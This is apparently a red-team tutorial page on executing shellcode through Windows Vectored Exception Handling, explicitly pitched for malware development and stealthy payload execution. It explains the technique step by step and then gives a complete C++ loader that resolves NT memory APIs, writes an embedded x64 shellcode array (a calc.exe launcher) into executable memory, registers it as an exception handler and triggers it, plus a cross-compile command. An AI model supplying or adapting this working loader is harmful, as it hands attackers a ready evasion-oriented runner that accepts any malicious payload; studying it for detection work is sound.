# Vector Exception Handler Shellcode Execution

## Theory

Vectored Exception Handling (VEH) is a Windows mechanism that allows applications to register exception handlers before Structured Exception Handling (SEH) takes over. This mechanism can be abused for code injection and execution, making it useful for red team operations and malware development.&#x20;

#### **Vectored Exception Handling (VEH)**

Vectored Exception Handling provides a method for intercepting exceptions raised by a process before Structured Exception Handling (SEH) is engaged. Unlike SEH, which follows a per-thread linked list, VEH is process-wide, making it an attractive technique for stealthy payload execution.

The key API functions used in VEH execution include:

* `AddVectoredExceptionHandler`: Registers a custom exception handler.
* `RemoveVectoredExceptionHandler`: Unregisters the handler.
* `RaiseException`: Triggers an exception to execute the registered handler.

#### **Execution Flow**

1. **Retrieve NTAPI Function Pointers**:
   * Load `ntdll.dll` and resolve function addresses for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtProtectVirtualMemory` using `GetProcAddress`.
2. **Allocate Memory**:
   * Call `NtAllocateVirtualMemory` to allocate memory in the current process with `PAGE_READWRITE` permissions.
3. **Write Shellcode into Allocated Memory**:
   * Use `NtWriteVirtualMemory` to copy shellcode into the allocated region.
4. **Set Memory Permissions to Executable**:
   * Change the memory protection to `PAGE_EXECUTE_READ` using `NtProtectVirtualMemory`.
5. **Register the Vectored Exception Handler**:
   * Call `AddVectoredExceptionHandler`, specifying the allocated shellcode region as the handler function.
6. **Trigger Exception to Execute Shellcode**:
   * Call `RaiseException(0x41414141, 0, 0, NULL)`, which causes the VEH to intercept and execute the registered handler.
7. **Cleanup**:
   * After execution, `RemoveVectoredExceptionHandler` is called to unregister the handler.

## Practice

{% tabs %}
{% tab title="C++" %}
The following code implements this technique:

{% code title="Vectored.cpp" %}
```cpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

// Add these typedefs and function declarations for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
   
    // calc.exe shellcode
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);

    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;

    }
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
    }
    
    HANDLE hProc = GetCurrentProcess();
    DWORD oldProtect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = length;
    NTSTATUS status;

    // Allocate memory for shellcode
    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    std::cout << "Executing shellcode using Vectored Exception Handler..." << std::endl;

    // Register vectored exception handler pointing to shellcode
    PVOID handler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)base_addr);
    if (!handler) {
        std::cerr << "AddVectoredExceptionHandler failed with error: " << GetLastError() << std::endl;
    }

    // Trigger exception to execute handler
    RaiseException(0x41414141, 0, 0, NULL);

    // Remove handler after execution
    RemoveVectoredExceptionHandler(handler);

    std::cout << "Execution completed" << std::endl;
    return 0;
}

int main()
{
    esc_main(NULL);
    return 0;
}
```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ Vectored.cpp -o Vectored.exe -std=c++20 -static
```
{% endtab %}
{% endtabs %}

